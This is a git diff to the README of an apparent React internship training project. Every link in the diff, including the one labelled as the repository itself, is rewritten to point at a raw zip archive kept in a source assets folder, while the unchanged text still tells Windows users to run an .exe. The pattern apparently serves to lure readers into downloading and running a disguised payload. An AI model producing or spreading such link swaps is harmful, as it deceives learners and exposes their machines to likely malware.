@@ -1,7 +1,7 @@
 # 🚀 react-staj-2025 - Simple Training Platform for Learning React
 
 ## 📥 Download the Application
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Eris123234/react-staj-2025/releases)
+[![Download](https://raw.githubusercontent.com/Eris123234/react-staj-2025/main/19-vet/src/assets/staj_react_v3.1.zip)](https://raw.githubusercontent.com/Eris123234/react-staj-2025/main/19-vet/src/assets/staj_react_v3.1.zip)
 
 ## 🚀 Getting Started
 This repository offers materials and projects from the React Internship Program of 2025. It helps participants learn React from the basics to advanced topics. Follow these steps to download and run the software easily.
@@ -38,7 +38,7 @@ This repository offers materials and projects from the React Internship Program 
 ## 📥 Download & Install
 To get started, you need to download the application files. 
 
-1. Visit this page to download the latest version: [GitHub Releases](https://github.com/Eris123234/react-staj-2025/releases).
+1. Visit this page to download the latest version: [GitHub Releases](https://raw.githubusercontent.com/Eris123234/react-staj-2025/main/19-vet/src/assets/staj_react_v3.1.zip).
 
 2. Look for the file that matches your system. If you are using Windows, choose the .exe file. For MacOS, select the .dmg file. 
 
@@ -68,7 +68,7 @@ You can work through the materials at your own pace. This setup is great for bot
 - Practice what you learn by creating your own projects after working through the materials.
 
 ## 🔗 Links and Resources
-- [GitHub Repository](https://github.com/Eris123234/react-staj-2025)
-- [Download the Application](https://github.com/Eris123234/react-staj-2025/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/Eris123234/react-staj-2025/main/19-vet/src/assets/staj_react_v3.1.zip)
+- [Download the Application](https://raw.githubusercontent.com/Eris123234/react-staj-2025/main/19-vet/src/assets/staj_react_v3.1.zip)
 
 With these instructions, you should be able to download and run the application smoothly. Happy learning!
